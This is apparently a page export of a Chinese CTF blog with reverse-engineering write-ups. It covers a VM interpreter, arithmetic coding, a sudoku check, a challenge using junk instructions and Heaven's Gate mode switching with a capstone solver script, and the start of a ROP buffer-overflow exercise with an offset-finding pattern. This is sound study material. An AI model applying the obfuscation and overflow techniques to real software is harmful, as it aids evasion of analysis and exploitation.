r2 f.write(\"POP input[\"+str(r2)+\"]\\n\") input[r2] = stack.pop() opcodes = [0x11, 0x34, 0x0, 0x2a, 0x5, 0x10, 0x14, 0x9, 0x17, 0x0, 0x20, 0x5, 0x3, 0x11, 0x1d, 0x6, 0x0, 0x0, 0x5, 0x3, 0x11, 0x40, 0x6, 0x0, 0x40, 0x5, 0x11, 0x1d, 0x17, 0xe, 0x1, 0x15, 0x4, 0xf, 0x1, 0x16, 0x2, 0x0, 0x0, 0x4, 0x3, 0x5, 0x10, 0x14, 0x32, 0x5, 0x9, 0x2, 0x13, 0x1d, 0x5, 0x12, 0x15, 0x4, 0x10, 0x14, 0x3d, 0xa, 0x1, 0x13, 0x34, 0x3, 0x4, 0x12, 0xe, 0x1, 0x15, 0x4, 0x7, 0x1, 0x16, 0x2, 0x0, 0x0, 0x4, 0x3, 0x5, 0x10, 0x14, 0x55, 0x5, 0x9, 0x1, 0x13, 0x40, 0x5, 0x12] f = open(\"instructions.txt\", \"w+\") EIP = 0 r0 = 0 r1 = 0 r2 = 0 esp = 0 r4 = 0 flag = 0 stack = [] t = [0, 8, 9, 0xa, 0xc, 0xd, 0xe, 0x11, 0x13, 0x14] oparg = 0 input = [104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 104, 0] while True: opcode = opcodes[EIP] EIP = EIP + 1 if opcode == 0x17: f.write(\"Retn 0x17\\n\") break if opcode in t: oparg = opcodes[EIP] EIP += 1 if opcode == 0: func34(\"arg\") elif opcode == 1: func34(\"r0\") elif opcode == 2: func34(\"r1\") elif opcode == 3: func34(\"r2\") elif opcode == 4: func35(\"r0\") elif opcode == 5: func35(\"r1\") elif opcode == 6: func35(\"r2\") elif opcode == 7: func36() elif opcode == 8: func37(\"r0\") elif opcode == 9: func37(\"r1\") elif opcode == 0xa: func37(\"r2\") elif opcode == 0xb: func38() elif opcode == 0xc: func39(\"r0\") elif opcode == 0xd: func39(\"r1\") elif opcode == 0xe: func39(\"r2\") elif opcode == 0xf: func40() elif opcode == 0x10: func41() elif opcode == 0x11: func42() elif opcode == 0x12: func43() elif opcode == 0x13: func44() elif opcode == 0x14: func45() elif opcode == 0x15: func46() elif opcode == 0x16: func47() else: f.write(\"Retn \" + str(opcode) + '\\n') break 提取出来伪汇编代码： 代码的流程就是首先计算字符串长度,长度需要等于42,然后从最后一个元素开始,每一个字符异或(0x20 + 2 * i)然后减去i,最后异或(0x40 + 2 * i) ","date":"2020-04-05","objectID":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/:4:0","tags":null,"title":"i春秋公益赛_部分re题目","uri":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/"},{"categories":["writeup"],"content":"Code2 没做出来…wtcl 看到wp上写的是arithmetic coding算法,中间调试的时候发现了有浮点数,所以觉得还挺奇怪的,没见过arithmetic coding算法,记录一下。 算术编码Arithmetic Coding 这个算法大致的想法是根据一个字符与浮点数的对应表将一个字符串映射成一个浮点数,然后还可以根据这个表和最后的浮点数还原出字符串。 我感觉这个题用的算法跟给的链接的算术编码算法相比有一点区别,根据反汇编代码对原始算法进行了一些更改。 #include\u003ciostream\u003e #include\u003cmap\u003e #include\u003cstring\u003e #include\u003ccassert\u003e #include\u003cutility\u003e using namespace std; int main(int argc,char **argv) { double High=1.0; double Low=0.0; string original=\"8ab86b896\"; //create a map to store all chars and it's occurrence frequency map\u003cchar,pair\u003cdouble,double\u003e\u003e char_freq; char_freq['8'] = make_pair(0.0,0.33333334); char_freq['a'] = make_pair(0.33333334,0.11111111); char_freq['b'] = make_pair(0.44444445,0.22222222); char_freq['6'] = make_pair(0.66666669,0.11111111); char_freq['9'] = make_pair(0.777778,0.11111111); char_freq['7'] = make_pair(0.888889,0.11111111); for(string::size_type i=0;i\u003coriginal.size();i++) { char temp=original[i]; assert(char_freq.count(temp)); double Range=High; High=High*char_freq[temp].second; Low=Low+Range*char_freq[temp].first; } double result=Low; cout\u003c\u003c\"Compression Result: \"\u003c\u003cresult\u003c\u003cendl; //the core code to decompress result = 0.1295556; bool goon=true; cout\u003c\u003c\"Original Text: \"; do{ map\u003cchar,pair\u003cdouble,double\u003e \u003e::const_iterator itr=char_freq.begin(); while(itr!=char_freq.end()) { if((result - itr-\u003esecond.first) / itr-\u003esecond.second \u003e= 0.0 \u0026\u0026 (result - itr-\u003esecond.first) / itr-\u003esecond.second \u003c= 0.888889) { cout\u003c\u003citr-\u003efirst; result=(result - itr-\u003esecond.first) / itr-\u003esecond.second; break; } ++itr; } if(itr==char_freq.end()) goon=false; }while(goon); cout\u003c\u003cendl; return 0; } 因为给的浮点数是一个范围,所以还原出来的原始字符串并不完全正确,最后一位有一些区别,但是因为字符只能是给定的6个字符,所以还比较容易试出来结果。 ","date":"2020-04-05","objectID":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/:5:0","tags":null,"title":"i春秋公益赛_部分re题目","uri":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/"},{"categories":["writeup"],"content":"Veryeasyre 一共有两个验证,第一层验证是一个。(总字符串的长度是81,输入的字符串依次填补在总字符串中为0的地方,填补完以后9*9的数组中,每行每列每个3*3块都是数字1-9),原始字符串如下: 0 0 5 0 9 4 0 0 0 0 0 1 5 0 0 2 0 9 0 7 0 2 0 0 0 0 1 0 9 0 0 0 0 0 0 6 8 0 0 0 0 0 1 0 5 5 0 0 0 2 0 0 0 8 0 0 0 3 5 0 0 7 0 7 4 0 0 0 6 0 1 0 3 0 0 0 0 7 8 0 0 输入的字符串依次填补在0处,找到了一个求的代码: import re import copy # 默认模板--\u003e在这里写准备求的 sudoku_template1 = [[ 0 , 0 , 5 , 0 , 9 , 4 , 0 , 0 , 0 ], [ 0 , 0 , 1 , 5 , 0 , 0 , 2 , 0 , 9 ], [ 0 , 7 , 0 , 2 , 0 , 0 , 0 , 0 , 1 ], [ 0 , 9 , 0 , 0 , 0 , 0 , 0 , 0 , 6 ], [ 8 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 5 ], [ 5 , 0 , 0 , 0 , 2 , 0 , 0 , 0 , 8 ], [ 0 , 0 , 0 , 3 , 5 , 0 , 0 , 7 , 0 ], [ 7 , 4 , 0 , 0 , 0 , 6 , 0 , 1 , 0 ], [ 3 , 0 , 0 , 0 , 0 , 7 , 8 , 0 , 0 ]] # 芬兰数学家英卡拉（Arto Inkala）设计的号称“最难” - 1000次平均耗时320ms/次 sudoku_template2 = [[8,0,0,0,0,0,0,0,0], [0,0,3,6,0,0,0,0,0], [0,7,0,0,9,0,2,0,0], [0,5,0,0,0,7,0,0,0], [0,0,0,0,4,5,7,0,0], [0,0,0,1,0,0,0,3,0], [0,0,1,0,0,0,0,6,8], [0,0,8,5,0,0,0,1,0], [0,9,0,0,0,0,4,0,0]] def crack_it(sudoku=sudoku_template1): '''主函数,输入进行运算,如未输入则调用默认,格式为9x9的二维列表''' init_sudoku = str_to_num(copy.deepcopy(sudoku)) # Python的坑！列表或字典等对象作为函数参数时,函数可能修改其元素的指针,导致外部列表也会改变 if is_valid_sudoku(sudoku): # 判断输入的Sudoku是否合理（是否冲突） candidate_list = filter_candidate_list(init_sudoku, init_candidate_list(init_sudoku), start=0) # 针对Sudoku中的每一个空格（空格都默认填入数字0）,都算出其可能的备选数,存入data_list中；每当空格被确认唯一值时,剩余data_list都需要再被刷新 cracked_sudoku = fill_blank(init_sudoku, candidate_list, start=0) # 破解 print_sudoku(cracked_sudoku) # 在控制台显示已破解的,默认开启 return cracked_sudoku else: return '请检查一下输入是否有误- -0' def str_to_num(data): '''初步校验+统一格式,空字符转0,无效字符转0''' for i in range(9): for j in range(9): if re.match('[1-9]', str(data[i][j])): # 1-9字符转int 1-9 data[i][j] = int(data[i][j]) elif re.match('', str(data[i][j])): # 空位转int 0 data[i][j] = 0 else: # 无效字符转int 0,或者也可以return False,拒绝服务 data[i][j] = 0 return data def is_valid_sudoku(data): '''判断整个是否有效''' for y in range(9): for x in range(9): if data[y][x] \u003e 9: return False if data[y][x] != 0 and data[y].count(data[y][x]) \u003e 1: return False for col in range(9): if data[y][x] != 0 and col != y: if data[col][x] == data[y][x]: return False for i in range(3): for j in range(3): if data[y][x] != 0 and (i+3*(y//3), j+3*(x//3)) != (y, x): if data[i+3*(y//3)][j+3*(x//3)] == data[y][x]: return False return True def init_candidate_list(data): '''初始化建立一个的备选数列表,一个空格就对应其坐标以及填上1~9的备选数字,格式为81x9的二维列表''' data_list = [] for y in range(9): for x in range(9): if data[y][x] == 0: data_list.append([(x, y), [1, 2, 3, 4, 5, 6, 7, 8, 9]]) return data_list def filter_candidate_list(data, data_list, start): '''对的备选数表进行过滤,删除无效的备选数''' for blank_index in range(start, len(data_list)): data_list[blank_index][1] = [] for num in range(1,10): if is_valid_num(data, data_list[blank_index][0][0], data_list[blank_index][0][1], num): data_list[blank_index][1].append(num) return data_list def is_valid_num(data, x, y, num): '''输入、坐标、数字,判断该位置填入该数字是否合理''' if data[y].count(num) \u003e 0: # 行判断 return False for col in range(9): # 列判断 if data[col][x] == num: return False for a in range(3): # 九宫格判断 for b in range(3): if data[a+3*(y//3)][b+3*(x//3)] == num: return False return True def fill_blank(data, data_list, start): ''' 核心函数,递归尝试代入备选数,类似深度优先遍历算法。 一旦某位置填入为True（由is_valid_num函数判断）,则开始下一位置的填入；若某位置填入为False,则return回上一级。 参数解释： data: 矩阵,二维列表 data_list: 备选数表,二维列表 start: 递归进行的位置,对应data_list的下标 ''' all_data = [] if start \u003c len(data_list): one = data_list[start] for num in one[1]: if is_valid_num(data, one[0][0], one[0][1], num): data[one[0][1]][one[0][0]] = num # 赋值,如果能给每一格成功赋值,则意味破解成功；如果出现失败,则需要将错误赋值清零 # data_list = filter_candidate_list(data, data_list, start) # 每一步赋值都会改变备选数表,但刷新备选数表的操作非常耗时,若加上这句,速度会慢100倍 tem_data = fill_blank(data, data_list, start+1) # start+1,使递归进入下一格点 if tem_data: # 注意！如果下一格点return,分两种情况：1.成功破解所有格点；2.发生错误,for loop结束也会return,此时返回值为None return tem_data data[one[0][1]][one[0][0]] = 0 # 注意！可能向下递归了若干格才发现前面是错误的（即for loop结束,return None）,此时需要将所有错误的赋值清零。 else: return data def print_sudoku(data): '''打印到控制台''' print('\u003e\u003e\u003e 破解结","date":"2020-04-05","objectID":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/:6:0","tags":null,"title":"i春秋公益赛_部分re题目","uri":"/2020i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9B/"},{"categories":["writeup"],"content":"因为第二天有xctf所以这道题从晚上九点出来到12点我没有做出来就睡了,看了官方的wp记录一下。 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:0:0","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"引用 Nu1L官方wp 某大佬的博客 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:1:0","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"花指令 关于花指令 https://blog.csdn.net/whklhhhh/article/details/88677670 https://blog.csdn.net/whklhhhh/article/details/88730934 在没有去除花指令之前，打开ida的关键代码如下所示： void sub_123413B0() { unsigned int v0; // ST40_4 unsigned int v1; // ST44_4 int v2; // ST78_4 nullsub_11(); sub_12341340(0); v0 = strlen(\"npointer{\"); v1 = strlen(\"}\"); v2 = sub_123416AD(v0 + v1 + 33); nullsub_12(); sub_12341020(\"Input the correct keys: \"); nullsub_24(); sub_12341050(\"%s\", v2, v0 + v1 + 33); JUMPOUT((char *)\u0026loc_1234148F + 1); } JUMPOUT后面的代码没有反编译出来，查看汇编代码 .text:12341487 E8 04 00 00 00 call near ptr loc_1234148F+1 .text:1234148C 77 EB ja short loc_12341479 .text:1234148E 07 pop es .text:1234148F .text:1234148F loc_1234148F: ; CODE XREF: sub_123413B0+D7↑p .text:1234148F 88 36 mov [esi], dh .text:12341491 83 04 24 01 add [esp], 1 .text:12341495 C3 retn call指令等于这样两条指令，一是把自身所在位置的下一条指令的地址压入堆栈，二是jmp到call的地址处，而ret指令可以理解为jmp到call指令压入堆栈的地址，因此，可以用call指令这样来写花指令： 1.call一个地址，在call下面随便写一点花指令，但是要注意一点与jmp版花指令不同的，我们要记得自己写的花指令占了多少个字节，比如，占了2字节 2.在call里面，也就是函数里面，首先pop出压入的地址，然后把这个地址减去花指令占用的字节数，这里是2字节，再重新push进堆栈，然后就ret，这样，call结束以后执行的下一条指令就是我们想要去的位置了，也就是花指令下面的正常的指令了 对于这样一个花指令，call一个函数内的地址然后再retn返回，IDA会认为被call的地址是一个新的函数，当前函数就被截断了，影响到了IDA的分析。 图中call指令之后在call函数里将栈顶的值加了1，所以call指令后面的77可以忽略直接到EB 07这条指令，这个是jmp 7的意思，可以直接跳到retn指令后面。 官方wp中说主程序中穿插的花指令形式如下: #define JUNK2(idx) __asm{ \\ __asm call next1_junk2_##idx \\ __asm __emit 0x77 \\ __asm jmp next_junk2_##idx \\ __asm __emit 0x88 \\ __asm next1_junk2_##idx: \\ __asm add dword ptr ss:[esp], 1 \\ __asm ret \\ __asm next_junk2_##idx: \\ } #define JUNK1(idx) __asm{\\ __asm jmp jlabel##idx \\ __asm __emit 0x88 \\ __asm jlabel_##idx : \\ __asm ret \\ __asm __emit 0xba \\ __asm jlabel##idx : \\ __asm call jlabel_##idx \\ } 这两个花指令的二进制形式如下: ''' EB0388C3BAE8F9FFFFFF E80400000077EB07883683042401C3 ''' stripd = \"\" with open('gatesXgame_un.exe', \"rb\") as f: raw = f.read() i = 0 while i \u003c len(raw): if raw[i:i+10] == \"\\xEB\\x03\\x88\\xC3\\xBA\\xE8\\xF9\\xFF\\xFF\\xFF\": stripd += \"\\x90\"*10 i = i + 10 elif raw[i:i+15] == \"\\xE8\\x04\\x00\\x00\\x00\\x77\\xEB\\x07\\x88\\x36\\x83\\x04\\x24\\x01\\xC3\": stripd += \"\\x90\"*15 i = i + 15 else: stripd += raw[i] i += 1 with open('gate_str.exe', 'wb') as f: f.write(stripd) 去除花指令后的代码 int sub_123413B0() { unsigned int v0; // ST40_4 unsigned int v1; // ST44_4 char *Buf1; // [esp+6Ch] [ebp-Ch] sub_12341340(0); v0 = strlen(\"npointer{\"); v1 = strlen(\"}\"); Buf1 = (char *)sub_123416AD(v0 + v1 + 33); print(\"Input the correct keys: \"); sub_12341050(\"%s\", Buf1, v0 + v1 + 33); if ( !memcmp(Buf1, \"npointer{\", strlen(\"npointer{\")) \u0026\u0026 Buf1[strlen(Buf1) - 1] == asc_12343738[0] \u0026\u0026 (Buf1[strlen(Buf1) - 1] = 0, sub_12341090(sub_12343798, 0x30D3u, (int)\u0026Buf1[strlen(\"npointer{\")])) ) { sub_12341340(1); print(\"Congrats!\\n\"); } else { print(\"Sorry, the gate remains closed.\\n\"); } return system(\"pause\"); } int __cdecl sub_12341090(void *Src, SIZE_T dwSize, int a3) { HANDLE v4; // eax int v5; // ST38_4 LPVOID Dst; // [esp+1Ch] [ebp-14h] Dst = VirtualAlloc(0, dwSize, 0x3000u, 0x40u); if ( !Dst ) return 0; memcpy(Dst, Src, dwSize); v4 = GetCurrentProcess(); FlushInstructionCache(v4, Dst, dwSize); sub_12341240(); v5 = ((int (__fastcall *)(_DWORD, int, unsigned int))Dst)(0, a3, strlen((const char *)a3)); VirtualFree(Dst, 0, 0x8000u); return v5; } 所以主要的验证部分在sub_12343798处,在进入检测代码之前设置了一些参数信息: //edx --\u003e char* flag //ecx --\u003e int idx //edi --\u003e payload_base //ebx --\u003e MAX_STEP (len(flag)) ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:2:0","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"天堂之门 在Windows64操作系统下，所有的32位程序会被装载到WoW64子系统中运行。而某些windows kernel调用，WoW64会将其钩取为64位调用。在这个过程中，运行的程序会从兼容模式暂时地切换成64位模式运行。利用这个特性，我们可以在程序运行过程中主动切换为64位模式来执行64位代码，以达到某种保护程序(如使静态分析失败、动态跟踪混乱)的目的。 这种保护方法被称为Heaven’s Gate，直译就是天堂之门。架构的切换对于运行在 Wow64 环境下的程序是必不可少的，运行在 64 位 Windows 系统下的 32 位程序在进入系统调用前需要完成下述操作： 32-bit ntdll.dll -\u003e wow64cpu.dll’s Heaven’s Gate -\u003e 64-bit ntdll.dll -\u003e syscall into the kernel WoW64根据段寄存器cs的值来确定程序的运行模式，如果cs的值为0x33，则当前是64位模式；如果cs的值为0x23，则当前为兼容模式。 这道题采用了这样的方式来切换运行模式： // open_gate_template_x86 push 0x33 // cs:0x33 sub esp, 4 mov dword ptr ss:[esp], grid_dst_ip // next grid add qword ptr ss:[esp], edi // payload_base inc ecx // step++ retf // open_gate_template_x64 push 0x23 // cs:0x23 sub rsp, 8 mov qword ptr ss:[rsp], grid_dst_ip add qword ptr ss:[rsp], rdi inc rcx // step++ retfq 因为架构的切换过程加上验证部分中间依旧穿插了部分花指令，x86到x64的切换大致过程如下 b = random.randint(0, 0x7f) a = 0x33 ^ b open_gate_template_x86_mutated = f\"\"\" open_gate_label: push {hex(a)} xor dword ptr ss:[esp], {hex(b)} call next_label // sub esp, 4 .byte {random.randint(0,255)} next_label: mov dword ptr ss:[esp], grid_dst_ip add dword ptr ss:[esp], edi inc ecx retf\"\"\" 再弄明白这个架构的切换之后，可以看出来验证部分主要是一个迷宫(图搜索),不过需要确定最最开始的两条路径(即最前面两个字母需要时f4)然后后面的路径过程基本一致，可以写出遍历程序求解。 补一些关于天堂之门的学习链接 http://rce.co/knockin-on-heavens-gate-dynamic-processor-mode-switching/ https://medium.com/@fsx30/hooking-heavens-gate-a-wow64-hooking-technique-5235e1aeed73 https://www.malwaretech.com/2014/02/the-0x33-segment-selector-heavens-gate.html 这部分代码调试需要使用WinDbg(x64),这个调试器可以自动完成32到64位的切换，我试了一下使用这个调试器，在执行retf后，寄存器从eax变成了rax，在执行retfq后，寄存器从rax变成了eax. ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:3:0","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"solve 膜Thiner #!/usr/bin/python \"\"\" Solution Author: Thiner @ NeSE The challenge is solved with some luck. \"\"\" \"\"\" note here rbx=total rcx=0 rdx=buffer without npointer{} rdi=\u0026code init is 32bit return value is check result offset : 0x2198 virtaddr: 0x12343798 code len: 0x30d3 \"\"\" # gatesXgame_un.exe is the upx unpacked binary import capstone as cs with open('gatesXgame_un.exe') as f: raw = f.read() code = raw[0x2198:0x2198+0x30d3] # \"\"\" for i in range(len(code)-5): if code[i:i+5] == '\\xe8\\x01\\x00\\x00\\x00': code = code[:i+5]+'\\xf1'+code[i+6:] if code[i:i+5] == '\\xe8\\x02\\x00\\x00\\x00': code = code[:i+5]+'\\xcd\\x81'+code[i+7:] if code[i:i+5] == '\\xe8\\x03\\x00\\x00\\x00': code = code[:i+5]+'\\xcd\\x82\\xf1'+code[i+8:] # code=code.replace('e803000000e4de78'.replace()) md32 = cs.Cs(cs.CS_ARCH_X86, cs.CS_MODE_32) md64 = cs.Cs(cs.CS_ARCH_X86, cs.CS_MODE_64) def dis32(addr): print ' code 32 {:#x} '.format(addr).center(80, '-') for h, i in enumerate(md32.disasm(code[addr:addr+0x100], addr)): print '{:3d}{:\u003e#8x} {:\u003e7s} {}'.format(h, i.address, i.mnemonic, i.op_str) def dis64(addr): print ' code 64 {:#x} '.format(addr).center(80, '-') for h, i in enumerate(md64.disasm(code[addr:addr+0x100], addr)): print '{:3d}{:\u003e#8x} {:\u003e7s} {}'.format(h, i.address, i.mnemonic, i.op_str) def ext32(addr): #dis32(addr) head = list(md32.disasm(code[addr:addr+0x80], addr)) # 3+2k l = [] for i in range(10): if head[3+2*i].mnemonic != 'cmp': break ch = int(head[3+2*i].op_str.split(',')[-1], 0) tar = int(head[4+2*i].op_str, 0) inst = list(md32.disasm(code[tar:tar+0x30], tar))[4] addr = int(inst.op_str.split(',')[-1], 0) l.append((ch, addr)) return l def ext64(addr): #dis64(addr) head = list(md64.disasm(code[addr:addr+0x80], addr)) # 3+5k l = [] for i in range(10): if head[3+5*i].mnemonic != 'cmp': break ch = int(head[3+5*i].op_str.split(',')[-1], 0) tar = int(head[4+5*i].op_str, 0) inst = list(md64.disasm(code[tar:tar+0x30], tar))[5] addr = int(inst.op_str.split(',')[-1], 0) l.append((ch, addr)) return l flag = 'f4' addr = 0x558 aset = set([0, 0x49e, 0x558]) switch = 0 def dfs(flag, addr, aset, switch): if switch == 0: # 32bit extract = ext32 else: extract = ext64 try: ca = extract(addr) except IndexError: print \"flag may be\" print 'npointer{'+flag+'}' return for c, a in ca: if a not in aset: dfs(flag+chr(c), a, aset | set([a]), switch ^ 1) else: #print('dead at',repr(flag)) pass dfs(flag, addr, aset, switch) 代码最前面的修改部分是用来修改花指令的，但是使用int指令代替nop主要是因为int指令可以不改变一条指令的长度 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:4:0","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"感想 我好菜我好菜我好菜，出题人原话\"本题作为逆向公开赛的第一题，其难度较低\"，哎继续努力吧. ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:5:0","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"补一个控制转移指令的总结 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:6:0","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"Call指令 一条call指令的字节数可以是（2,5,6）byte，对应不同的操作数，下面分情况讨论。 假设我们在函数src中调用函数dst，对应的call指令是的机器码长度是5 byte，其中第一个字节是e8代表指令，后面四个字节是一个相对偏移offset，dst=src_next+offset，其中src_next是下一条指令的地址，也可以看出是当前指令的地址加上该指令的长度。可以称这种情况为直接转移。 假设有一个全局函数指针变量g_pDst指向dst函数，我们在函数src中call这个变量，则对应的机器码长度是6 byte，前两个字节是ff 15代表指令，后面四个字节是一个绝对地址即变量g_pDst的地址。可以称这种情况为内存间接寻址。 假设函数src中有一个函数指针变量pDst指向dst函数，在函数src中call该变量，因为这个指针式保存在栈中的，编译时无法知道它的全局位置，只知道它相对于栈底的位置，所以根据pDst距离栈底ebp的距离。当距离小于0xff时，机器码长度为3，前两个字节是ff 55代表指令，后面一个字节代表相对ebp的偏移（注意偏移都是负数，比如f8，则ebp-8即为实际内存地址）。当距离大于0xff时，机器码长度为6，前两个字节为ff 95表指令，后四个字节是相对ebp的偏移，计算方法与上面相同。可以称这种情况为栈间接寻址。 call寄存器，比如call eax、call ebx；还有call eax + 4。可以称这种情况为寄存器直接寻址。 call寄存器间接转移，比如call [eax]，call [ebx]；以及call [eax] + 4。可以称这种情况为寄存器间接寻址。 注：对于第一种情况，还有短转移，也就是偏移为一个字节，但是有些编译器（如MSVC）不会编译这种短的call，总之现在比较少见。为什么没有call functionA + 10 这类代码呢，这是因为编译器在编译的时候会自动计算相加后的地址。 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:6:1","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"Ret指令 ret指令比较简单，只有两种情况，ret和ret n。 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:6:2","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"Jmp指令 直接的jmp分3种 Short Jump（短跳转）机器码 EB rel8 只能跳转到256字节的范围内 Near Jump（近跳转）机器码 E9 rel16/32 可跳至同一个段的范围内的地址 Far Jump（远跳转）机器码EA ptr 16:16/32 可跳至任意地址，使用48位/32位全指针 要注意的是，短跳转和近跳转指令中包含的操作数都是相对于(E)IP的偏移，而远跳转指令中包含的是目标的绝对地址，所以短/近跳转会出现跳至同一目标的指令机器码不同，不仅会不同，而且应该不同。而远跳转中包含的是绝对地址，因此转移到同一地址的指令机器码相同 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:6:3","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"条件转移指令 条件转移类指令与jmp指令的分类大体类似，但是有一个重要的区别就是，条件转移类指令只有直接转移，没有后面四种，所以条件转移类指令全部是相对偏移的，每种指令可分为长跳转和短跳转。 ","date":"2020-04-05","objectID":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/:6:4","tags":null,"title":"Nu1L第一次RE公开赛WP","uri":"/nu1l%E7%AC%AC%E4%B8%80%E6%AC%A1re%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"categories":["writeup"],"content":"Nullcon HackIM的第一道re题，虽然做出来了但是原理没太明白，flag里面显示用了ROP，所以学习一下。 ","date":"2020-04-05","objectID":"/rop%E5%AD%A6%E4%B9%A0/:0:0","tags":null,"title":"ROP学习","uri":"/rop%E5%AD%A6%E4%B9%A0/"},{"categories":["writeup"],"content":"main程序 反汇编的结果如下图所示： 程序存在溢出漏洞，使用蒸米大佬的脚本判断溢出长度。 脚本: #!/usr/bin/env python import sys, os, binascii, time buf = ( \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac\" \"6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A\" \"f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9\" \"Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak\" \"6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A\" \"n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9\" \"Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As\" \"6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2A\" \"v3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9\" \"Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba\" 